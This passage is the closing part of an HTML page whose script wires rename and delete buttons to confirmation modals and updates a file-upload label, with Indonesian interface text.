                })

                // Rename
                $('.gantinama-btn').click(function() {
                    var namaBarang = $(this).data('barang');
                    $('#gantinamabarang').text(namaBarang);
                    $('#gantinamabarangtetap').val(namaBarang);
                    $('#modalGantiNama').modal('show');
                });

                // Delete
                $('.hapus-btn').click(function() {
                    var namaBarang = $(this).data('barang');
                    $('#hapusbarang').text(namaBarang);
                    $('#hapusbarangtetap').val(namaBarang);
                    $('#modalHapus').modal('show');
                });
            });

            document.getElementById('ups').addEventListener('change', function() {
                var label = document.getElementById('uputama');
                if (this.files && this.files.length > 0) {
                    if (this.files.length === 1) {
                        var fileName = this.files[0].name;
                        if (fileName.length > 11) {
                            fileName = fileName.substring(0, 8) + '...';
                        }
                        label.textContent = fileName;
                    } else {
                        label.textContent = this.files.length + ' Berkas';
                    }
                } else {
                    label.textContent = 'Pilih Berkas';
                }
            });
        </script>
    </body>
</html>